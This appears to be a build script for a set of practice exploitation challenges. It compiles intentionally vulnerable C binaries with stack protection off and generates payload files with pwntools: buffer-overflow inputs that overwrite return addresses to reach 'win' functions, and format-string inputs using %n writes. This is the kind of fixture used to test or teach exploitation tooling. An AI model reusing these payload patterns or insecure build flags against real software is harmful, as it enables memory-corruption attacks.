#!/bin/sh
# Rebuild the audit challenges and their payloads.
set -e
cd "$(dirname "$0")"
gcc -fno-stack-protector -no-pie      -w c1_ret2win.c -o c1_ret2win && strip c1_ret2win
gcc -fno-stack-protector -no-pie      -w c2_nullbyte.c -o c2_nullbyte
gcc -fno-stack-protector -no-pie -m32 -w c3_bof32.c    -o c3_bof32
gcc -fno-stack-protector -no-pie -static -w c4_static.c -o c4_static
gcc -fno-stack-protector -no-pie      -w c5_fmt.c      -o c5_fmt
gcc -fno-stack-protector -pie -fPIE   -w c2_nullbyte.c -o c6_pie
printf '#!/bin/sh\necho hi\n' > notanelf.sh && chmod +x notanelf.sh

python3 - <<'PY'
from pwn import ELF, context, cyclic, p32, p64
context.log_level = "error"
w  = lambda n, b: open(n, "wb").write(b)
s  = lambda f, n: ELF(f, checksec=False).symbols[n]
w("p1_cyclic.bin", cyclic(200))
# A CANONICAL unmapped return address, built from six pattern bytes with the
# top two left zero -- which is what makes it canonical, and therefore what
# a real hijack actually looks like. s_cyclic.py needs exactly this shape.
_pat = cyclic(200)
w("p1_hijack.bin",  _pat[:72] + p64(int.from_bytes(_pat[72:78], "little")))
w("p1_win.bin",    b"A" * 72 + p64(0x401166))       # stripped; win found by objdump
w("p2_null.bin",   b"A" * 0x30 + b"B" * 8 + p64(s("c2_nullbyte", "win")) + b"\n")
w("p2_trunc.bin",  b"A" * 20 + b"\x00" + b"B" * 40 + b"\n")
w("p3_cyclic.bin", cyclic(120))
w("p3_win.bin",    b"A" * 52 + p32(s("c3_bof32", "win")))
w("p4_cyclic.bin", cyclic(200))
w("p4_win.bin",    b"A" * 0x60 + b"B" * 8 + p64(s("c4_static", "win")))
w("p5_fmt.bin",    b"%x %x %p %p [bold red]X[/] %s\n"
                   b"AAAA%10$n\n"
                   b"[/]{}[[ \\ %n %s %s %s %s\n")
w("p6_pie.bin",    b"A" * 0x30 + b"B" * 8 + p64(0x1189) + b"\n")
print("payloads regenerated")
PY
